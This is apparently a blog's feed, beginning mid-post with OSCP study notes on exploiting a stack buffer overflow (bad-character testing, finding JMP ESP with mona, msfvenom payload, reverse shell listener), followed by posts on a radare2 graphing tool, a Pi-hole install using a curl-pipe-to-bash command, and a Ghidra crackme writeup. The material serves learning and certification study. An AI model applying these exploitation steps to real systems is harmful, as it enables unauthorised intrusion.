&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; 
&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; 
&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; 
&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; 
&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; 
&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; 
&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; 
&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; 
&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Send the whole string to the vulnerable application. If one of the character is a badchar, then it will delete the rest of the string or not show up. Gradually delete values that are badchars until the whole string is able to be sent, and make sure you keep a list of badchars that have been deleted.&lt;/p&gt;

&lt;p&gt;4.) We need to find some instruction that says “JMP ESP” so that we can just jump to the location our input and start executing code. Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona modules&lt;/code&gt; command in Immunity to find DLLs that have Rebase, SafeSEH, ASLR, and NXCompat set to false (which basically means that the DLL will always load at the same address). Once you find a good DLL, use the follwing command to find a JMP ESP command: &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona find -s &quot;\xff\xe4&quot; -m [DLL's file name]&lt;/code&gt;. Note that the hex equivalent of JMP ESP is \xff\xe4, but you may have to modify this depending on your machine. This command will return a list of pointers to a JMP ESP instruction; select one that does not have any bad characters. If you’re using EDB, open up the OpcodeSearcher plugin, set the Jump Equivalent value to ESP-&amp;gt;EIP, and hit find. Confirm that the JMP works by setting a breakpoint at that location and setting EIP equal to that address of the jump instruction using the buffer overflow.&lt;/p&gt;

&lt;p&gt;5.) Develop a payload using msfvenom that does not contain any bad characters.&lt;/p&gt;

&lt;p&gt;6.) After you create the payload, sometimes you may have to execute some extra code before running the payload, in which case, you can use /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to quickly write assembly code. You may also want to put a NOP sled at the beginning of your code if there is space.&lt;/p&gt;

&lt;p&gt;7.) Setup a reverse shell listener. Create your final exploit and run it.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</summary></entry><entry><title type="html">Creating a Code Grapher Tool</title><link href="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html" rel="alternate" type="text/html" title="Creating a Code Grapher Tool" /><published>2019-11-27T00:00:00-05:00</published><updated>2019-11-27T00:00:00-05:00</updated><id>http://localhost:4000/2019/11/27/creating-code-grapher-tool</id><content type="html" xml:base="http://localhost:4000/2019/11/27/creating-code-grapher-tool.html">&lt;p&gt;A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;this simple tool&lt;/a&gt; came from.&lt;/p&gt;

&lt;p&gt;To give you an example of how this works, suppose you wanted to reverse engineer the following function:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000000000001135 &amp;lt;magic&amp;gt;:
    1135:	55                   	push   %rbp
    1136:	48 89 e5             	mov    %rsp,%rbp
    1139:	89 7d fc             	mov    %edi,-0x4(%rbp)
    113c:	8b 45 fc             	mov    -0x4(%rbp),%eax
    113f:	0f af 45 fc          	imul   -0x4(%rbp),%eax
    1143:	5d                   	pop    %rbp
    1144:	c3                   	retq   

0000000000001145 &amp;lt;main&amp;gt;:
    1145:	55                   	push   %rbp
    1146:	48 89 e5             	mov    %rsp,%rbp
    1149:	48 83 ec 10          	sub    $0x10,%rsp
    114d:	bf 03 00 00 00       	mov    $0x3,%edi
    1152:	e8 de ff ff ff       	callq  1135 &amp;lt;magic&amp;gt;
    1157:	89 45 fc             	mov    %eax,-0x4(%rbp)
    115a:	8b 45 fc             	mov    -0x4(%rbp),%eax
    115d:	89 c6                	mov    %eax,%esi
    115f:	48 8d 3d 9e 0e 00 00 	lea    0xe9e(%rip),%rdi        # 2004 &amp;lt;_IO_stdin_used+0x4&amp;gt;
    1166:	b8 00 00 00 00       	mov    $0x0,%eax
    116b:	e8 c0 fe ff ff       	callq  1030 &amp;lt;printf@plt&amp;gt; 1170:	b8 00 00 00 00       	mov    $0x0,%eax
    1175:	c9                   	leaveq 
    1176:	c3                   	retq   
    1177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    117e:	00 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you use my script and run the following command, a graph will appear, which will display all of the outputs for the magic() function when you use inputs in the range [0,100] (0 is inclusive, 100 is exclusive).&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;float: center;&quot; src=&quot;../../../assets/img/2019-11-27-creating-a-code-grapher-tool/graph.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Furthermore, there is also a list of points printed out in the output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Points:
[(0, 0), (1, 1), (2, 4), (4, 16), (3, 9), (5, 25), (7, 49), (6, 36), (8, 64), (9, 81), (14, 196), (10, 100), (11, 121), (12, 144), (13, 169), (17, 289), (16, 256), (15, 225), (18, 324), (19, 361), (23, 529), (20, 400), (21, 441), (22, 484), (24, 576), (26, 676), (25, 625), (28, 784), (27, 729), (30, 900), (29, 841), (32, 1024), (31, 961), (33, 1089), (35, 1225), (36, 1296), (34, 1156), (37, 1369), (38, 1444), (41, 1681), (39, 1521), (40, 1600), (42, 1764), (43, 1849), (46, 2116), (44, 1936), (45, 2025), (47, 2209), (49, 2401), (50, 2500), (48, 2304), (51, 2601), (53, 2809), (54, 2916), (52, 2704), (55, 3025), (56, 3136), (57, 3249), (58, 3364), (60, 3600), (59, 3481), (61, 3721), (62, 3844), (64, 4096), (63, 3969), (65, 4225), (66, 4356), (71, 5041), (67, 4489), (68, 4624), (70, 4900), (69, 4761), (72, 5184), (76, 5776), (74, 5476), (75, 5625), (73, 5329), (80, 6400), (81, 6561), (78, 6084), (77, 5929), (79, 6241), (85, 7225), (83, 6889), (84, 7056), (86, 7396), (82, 6724), (88, 7744), (89, 7921), (87, 7569), (90, 8100), (91, 8281), (94, 8836), (93, 8649), (92, 8464), (96, 9216), (95, 9025), (97, 9409), (98, 9604), (99, 9801)]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Essentially, the way that this works is that my Python script will set two breakpoints. In this example, the breakpoints were set at sym.magic and sym.main+21. At sym.magic, the input register (which is set to be rdi) is changed to be one of the input values in the specified range. At sym.main+21, eax is read as the output value, and the point (rdi, eax) is plotted onto the graph.&lt;/p&gt;

&lt;p&gt;The script is implemented using &lt;a href=&quot;https://github.com/radareorg/radare2-r2pipe&quot;&gt;r2pipe&lt;/a&gt;, which allows me to use radare2 commands from within Python and receive their output, and &lt;a href=&quot;https://matplotlib.org/&quot;&gt;matplotlib&lt;/a&gt;, which allows me to easily create graphs in a few lines of code.&lt;/p&gt;

&lt;p&gt;There are several options built within the script that you can use to aid your analysis. You can see all of the options below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python grapher.py -h 
usage: grapher.py [options] filename start stop input output range

Analyzes specified lines of code by executing the code using the given input
values, recording the output, and displaying the input and output in a graph.

positional arguments:
  filename              The name of the executable you would like to analyze.
  start                 The first breakpoint will be set at this location. At
                        the breakpoint, the input register or memory location
                        will be changed to the next value in the range.
  stop                  The second breakpoint will be set at this location. At
                        the breakpoint, the output will be recorded.
  input                 The register or memory location that contains the
                        input value that should be bruteforced. Will be
                        displayed on the x-axis. Example: &quot;eax&quot;. If using a
                        memory location, please specify the location using
                        m[location]. Example: &quot;m[rbp-0x8]&quot;.
  output                The register or memory location that contains the
                        output values that should be checked after the code is
                        executed. Will be displayed on the y-axis. Example:
                        &quot;eax&quot;. If using a memory location, please specify the
                        location using m[location]. Example: &quot;m[rbp-0x8]&quot;.
  range                 The range of values that should be used for the input
                        during the bruteforce process. Should be in the form
                        &quot;[lower,upper]&quot; or &quot;[lower,upper,step]&quot;. For example:
                        [0,101,5] will use 0, 5, 10, ..., 95, 100 as the x
                        values in the graph. These must be in base 10
                        (hexadecimal or binary will not work).

optional arguments:
  -h, --help            show this help message and exit
  -t [THREADS], --threads [THREADS]
                        The number of threads that will be used during
                        execution. Default value is 5.
  -in [INPUT_FILE], --standard-input [INPUT_FILE]
                        Uses the 'dor stdin=[INPUT_FILE]' command in radare2
                        to make the executable read standard input from a
                        given file instead of having the user type it in.
  -il [INPUT_LENGTH], --input-length [INPUT_LENGTH]
                        The amount of bytes placed at the input memory
                        location. Default value is 1, but this will be
                        automatically adjusted if it is too small. Is only
                        used if the input is a memory location and not a
                        register.
  -ol [OUTPUT_LENGTH], --output-length [OUTPUT_LENGTH]
                        The amount of bytes read at the output memory
                        location. Must be equal to either 1, 2, 4, or 8.
                        Default value is 1. Is only used if the output is a
                        memory location and not a register.
  -e [COMMANDS], --execute [COMMANDS]
                        Executes the given r2 commands in radare2 right after
                        the debugger hits the first breakpoint, but before the
                        input value is set. Example: -e &quot;dr ebx = 7&quot; will
                        always set ebx equal to 7 at the first breakpoint.
                        Multiple commands can be separated by a semicolon.
  -hx, --x-axis-hex     Displays the x-axis in hexadecimal instead of denary.
  -hy, --y-axis-hex     Displays the y-axis in hexadecimal instead of denary.
  -j, --jump            Instead of running all of the code that comes before
                        the breakpoint, if this option is set, rip/eip will
                        immidiately be set to the start value as soon as the
                        program opens. This will essentially jump over any
                        code that comes before the first breakpoint, and it
                        will make the program only execute the code between
                        the starting and stopping breakpoints.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The script can be found &lt;a href=&quot;https://github.com/nihaal-prasad/Code-Grapher&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">A little while ago, I was working on some reverse-engineering CTF problems. I was trying to figure out what a particular function was doing by giving it a particular input, stepping over the function, reading its output, and then repeating those three steps over and over again with different input values so that I could try to guess what the function was trying to do. I then realized that I could easily automate that process using a script, which is where the idea for this simple tool came from.</summary></entry><entry><title type="html">Network-wide Ad Blocking Using Pi-hole</title><link href="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html" rel="alternate" type="text/html" title="Network-wide Ad Blocking Using Pi-hole" /><published>2019-06-15T00:00:00-04:00</published><updated>2019-06-15T00:00:00-04:00</updated><id>http://localhost:4000/2019/06/15/pi-hole-ad-blocker</id><content type="html" xml:base="http://localhost:4000/2019/06/15/pi-hole-ad-blocker.html">&lt;p&gt;As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using &lt;a href=&quot;https://pi-hole.net/&quot;&gt;Pi-hole&lt;/a&gt;. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.&lt;/p&gt;

&lt;p&gt;So lets get right into how I did this. The first thing I did was that I SSH’ed into my raspberry pi and typed in the below command to start installing Pi-hole.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sSL https://install.pi-hole.net | bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/installing.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, I had to select the upstream DNS provider, which is who my raspberry pi would forward DNS requests to if the DNS query is not on the blacklist. I like to use &lt;a href=&quot;https://www.quad9.net/&quot;&gt;Quad9’s DNS server&lt;/a&gt; as opposed to Google’s DNS server (or any other popular DNS server) because Quad9 uses threat intelligence in order to block malware and other threats.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/quad9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pi-hole also asked me if I wanted to change the third-party lists that they use or if I wanted to change which protocol they used. I kept the default values.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lists.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/protocols.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I kept my current network settings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/ip.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I kept the default values for everything else.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webadmin.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/lighttpd.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/logging.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/privacy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/complete.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once everything was done on my raspberry pi’s side, I had to go into my router settings to change the DNS server settings so that they pointed to my new DNS server. I used Quad9’s DNS server as my backup secondary DNS server in case my raspberry pi failed for whatever reason.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/dnssettings.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also went ahead and changed my current raspberry pi’s IP address to be a static IP address that the DHCP server could not change.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/staticip.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, everything was finished. I could now login to my Pi-hole’s web admin page and see it all running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-6-15-pi-hole-ad-blocker/webpage.png&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">As someone who loves using Raspberry Pis, I thought that it would be a fun project to setup an ad blocking DNS server on my network using Pi-hole. Pi-hole, for those who do not know, is a DNS server that automatically tries to detect and block domains that have known advertisements. The way that it works is that normally, if your computer encounters a domain name without knowing its IP address, it will send a query to a DNS server, which will tell the computer what the corresponding IP address is (or forward it to another DNS server if it does not know). Pi-hole uses blacklists of domains to make sure that if you send a DNS request to it, it prevent you from accessing those domains.</summary></entry><entry><title type="html">Solving a Basic Crackme Using Ghidra</title><link href="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html" rel="alternate" type="text/html" title="Solving a Basic Crackme Using Ghidra" /><published>2019-03-11T00:00:00-04:00</published><updated>2019-03-11T00:00:00-04:00</updated><id>http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra</id><content type="html" xml:base="http://localhost:4000/2019/03/11/solving-a-basic-crackme-using-ghidra.html">&lt;p&gt;Recently, the NSA released a free reverse-engineering tool called &lt;a href=&quot;https://www.nsa.gov/resources/everyone/ghidra/&quot;&gt;Ghidra&lt;/a&gt;. Today, I decided to take a look at it and try to solve a basic crackme using this tool. &lt;a href=&quot;https://crackmes.one/crackme/5c1a939633c5d41e58e005d1&quot;&gt;This&lt;/a&gt; is the link to the crackme that I will be trying to solve today.&lt;/p&gt;

&lt;p&gt;Once I downloaded the crackme file, I ran it and looked at what the program did. Here is its basic output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
a
wrong string
No flag for you.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enter the magic string
Some Random Input
too long...sorry no flag for you!!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It looks like it takes some sort of input value, and if that input value is what it expects, then it will print out the flag. If the input value is incorrect or too long, then it will print out a different message. Our goal here is to find out the correct input value.&lt;/p&gt;

&lt;p&gt;I started up Ghidra, created a new project, and added the binary file to my project. You can do this by first clicking File-&amp;gt;New Project, and then dragging and dropping the binary file into the project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/ghidra_project.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;float: right&quot; src=&quot;../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/symbol_tree.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When I opened the file in Ghidra, a pop-up came up in Ghidra asking me if I wanted to analyze the binary now. I hit yes and waited a second before it was done analyzing the file. Then I went to the symbol tree on the left, typed in “main” to find the main function, and clicked on it. This brought me to the main method, and on the other two windows I could see the main method’s assembly and decompiled code.&lt;/p&gt;

&lt;p&gt;Here is the decompiled code. I changed a few of the variable names to make it a little bit more readable. You can do this by right-clicking on the variable and clicking “Rename variable.”&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;undefined8 main(void)

{
  size_t len;
  size_t len2;
  long lVar1;
  char input [112];
  int counter;
  int strValues;
  
  strValues = 0;
  puts(&quot;enter the magic string&quot;);
  fgets(input,100,stdin);
  len = strlen(input);
  if (len &amp;lt; 0xc) {
    counter = 0;
    while( true ) {
      len2 = strlen(input);
      if (len2 &amp;lt;= (ulong)(long)counter) break;
      strValues = strValues + (int)input[(long)counter];
      counter = counter + 1;
    }
    if (strValues == 1000) {
      lVar1 = strcat_str();
      printf(&quot;flag is flag{&quot;);
      counter = 0;
      while (counter &amp;lt; 10) {
        putchar((int)*(char *)(lVar1 + (long)counter));
        counter = counter + 1;
      }
      puts(&quot;}&quot;);
    }
    else {
      puts(&quot;wrong string\nNo flag for you.&quot;);
    }
  }
  else {
    puts(&quot;too long...sorry no flag for you!!!&quot;);
  }
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that the code does is print out “enter the magic string” and reads in the value that you typed in into a variable that I named “input”. It also calculates the length of this input variable and makes sure that it is less than 12 (which makes it a maximum of ten characters plus a newline character). After that, there is a loop that adds up all of the ascii values of each character of the input into an integer that I named “strValues”. Then, finally, it prints out the flag if the total values of all the added ascii values equals 1000.&lt;/p&gt;

&lt;p&gt;Since I knew that I could type in a maximum of ten characters, the first thing I tried to do was to divide 1000 by 10 to figure out the ascii value of the characters that I needed to type in ten times. Since 1000/10 = 100, and ‘d’ is 100 in ascii, I decided to type in ‘d’ ten times and see what happened.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('d' * 10)&quot; | ./rev30
enter the magic string
wrong string
No flag for you.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unforunately, this did not work. At first I didn’t understand why this didn’t work, but then I realized that I forgot to take into account the fact that the while loop was also adding up the value of the newline character, which had an ascii value of 10. This meant that instead of doing 1000/10 to figure out the ascii value of the character I had to type in 10 times, I had to do (1000-10)/10 to take this into account. This gave me a value of 99, or ‘c’ in ascii. I tried to use ‘c’ ten times, and lo and behold:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;print('c' * 10)&quot; | ./rev03 
enter the magic string
flag is flag{!#&amp;amp;*/5&amp;lt;DMW}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks for reading this writeup. I hope you enjoyed it.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
          Creating a Barebones Windows Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Recently, the NSA released a free reverse-engineering tool called Ghidra. Today, I decided to take a look at it and try to solve a basic crackme using this tool. This is the link to the crackme that I will be trying to solve today.</summary></entry></feed>